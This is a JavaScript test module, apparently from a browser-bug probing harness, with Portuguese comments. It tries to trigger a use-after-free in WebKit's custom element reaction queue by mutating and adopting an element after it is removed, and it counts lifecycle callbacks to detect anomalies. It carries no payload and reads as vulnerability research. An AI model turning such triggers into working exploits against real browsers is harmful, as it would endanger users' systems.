/**
 * SC_CUSTOM_ELEMENT_UAF.JS
 * Categoria : DOM — Use-After-Free (Custom Elements)
 * Alvo      : WebCore::CustomElementReactionQueue C++ lifecycle
 * Técnica   : Define um Custom Element com todos os lifecycle callbacks
 *             (connectedCallback, disconnectedCallback, attributeChangedCallback),
 *             remove o elemento do DOM e dispara callbacks pendentes.
 *             A ReactionQueue C++ pode manter referência stale ao elemento.
 * Referência: WebKit Custom Elements reaction queue UAF
 */

export default {
    id:          'CUSTOM_ELEMENT_UAF',
    category:    'DOM',
    risk:        'HIGH',
    description: 'Custom Element lifecycle callbacks sobre elemento removido. '
                + 'Testa WebCore::CustomElementReactionQueue com elemento stale.',

    _el:              null,
    _container:       null,
    _tagName:         'uaf-ce-' + Math.floor(Math.random() * 0xFFFF).toString(16),

    // Numéricos — contadores de callbacks
    _connCount:       -1,
    _disconnCount:    -1,
    _attrCount:       -1,
    _adoptCount:      -1,

    // Strings
    _lastAttrName:    'none',
    _lastAttrValue:   'none',
    _lastConnState:   'pending',

    supported: function() {
        return typeof customElements !== 'undefined'
            && typeof customElements.define === 'function';
    },

    setup: async function() {
        this._connCount    = 0;
        this._disconnCount = 0;
        this._attrCount    = 0;
        this._adoptCount   = 0;
        this._lastAttrName  = 'none';
        this._lastAttrValue = 'none';
        this._lastConnState = 'pending';

        const self = this;

        // Define o Custom Element com todos os callbacks
        if (!customElements.get(this._tagName)) {
            class UafElement extends HTMLElement {
                static get observedAttributes() {
                    return ['data-uaf', 'data-val', 'data-trigger'];
                }
                connectedCallback() {
                    self._connCount++;
                    self._lastConnState = String(this.isConnected);
                }
                disconnectedCallback() {
                    self._disconnCount++;
                    self._lastConnState = String(this.isConnected);
                }
                attributeChangedCallback(name, _old, val) {
                    self._attrCount++;
                    self._lastAttrName  = name;
                    self._lastAttrValue = val ?? 'null';
                }
                adoptedCallback() {
                    self._adoptCount++;
                }
            }
            customElements.define(this._tagName, UafElement);
        }

        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        this._el = document.createElement(this._tagName);
        this._el.setAttribute('data-uaf',  'init');
        this._el.setAttribute('data-val',  '42');

        this._container.appendChild(this._el);

        // Aguarda upgrade do Custom Element
        await customElements.whenDefined(this._tagName);
        await new Promise(r => setTimeout(r, 20));
    },

    trigger: async function() {
        // Fila mutações antes de remover (ficam na ReactionQueue C++)
        this._el.setAttribute('data-trigger', '1');
        this._el.setAttribute('data-uaf',     'pre-remove');

        // Remove — dispara disconnectedCallback e pendura mutations na queue
        this._el.remove();
        void document.body.offsetWidth;

        // Muta atributos no elemento removido — ReactionQueue stale
        try { this._el.setAttribute('data-uaf', 'post-remove'); }  catch(_) {}
        try { this._el.setAttribute('data-val', '0xDEAD'); }       catch(_) {}
        try { this._el.removeAttribute('data-trigger'); }           catch(_) {}

        // Tenta adotar o elemento para outro documento
        try {
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            iframe.contentDocument?.adoptNode(this._el);
            iframe.remove();
        } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    probe: [
        // [0-3] contadores de callbacks — sempre number
        s => s._connCount,      // deve ser 1 (só connected uma vez)
        s => s._disconnCount,   // deve ser 1 (só disconnected uma vez)
        s => s._attrCount,      // se subiu demais pós-remoção = ReactionQueue UAF
        s => s._adoptCount,

        // [4-7] último atributo processado — sempre string
        s => s._lastAttrName,
        s => s._lastAttrValue,
        s => s._lastConnState,
        s => s._el.getAttribute('data-uaf') ?? 'null',

        // [8-11] estado do elemento após remoção
        s => String(s._el.isConnected),
        s => s._el.getAttribute('data-val') ?? 'null',
        s => s._el.tagName.toLowerCase(),
        s => String(s._el.ownerDocument === document),

        // [12-13] container
        s => String(s._container.isConnected),
        s => s._container.children.length,
    ],

    cleanup: async function() {
        this._container?.remove();
        this._container = null; this._el = null;
        this._connCount = -1; this._disconnCount = -1;
        this._attrCount = -1; this._adoptCount = -1;
        this._lastAttrName  = 'none'; this._lastAttrValue = 'none';
        this._lastConnState = 'pending';
    }
};
